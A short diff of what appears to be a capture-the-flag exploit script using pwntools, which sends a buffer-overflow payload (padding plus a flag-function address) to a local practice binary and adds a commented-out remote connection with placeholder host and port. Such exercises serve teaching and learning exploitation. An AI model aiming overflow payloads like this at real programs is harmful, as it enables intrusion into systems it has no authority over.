@@ -117,6 +117,7 @@ payload = b"A" * 0x48 + b"B" * 4 + flag_address
 
 # Exploiting the binary
 binary = process("./hidden_flag_function")
+#binary = remote("xxx", 0000)
 print(binary.recv())
 binary.sendline(payload)
 print(binary.recvall())
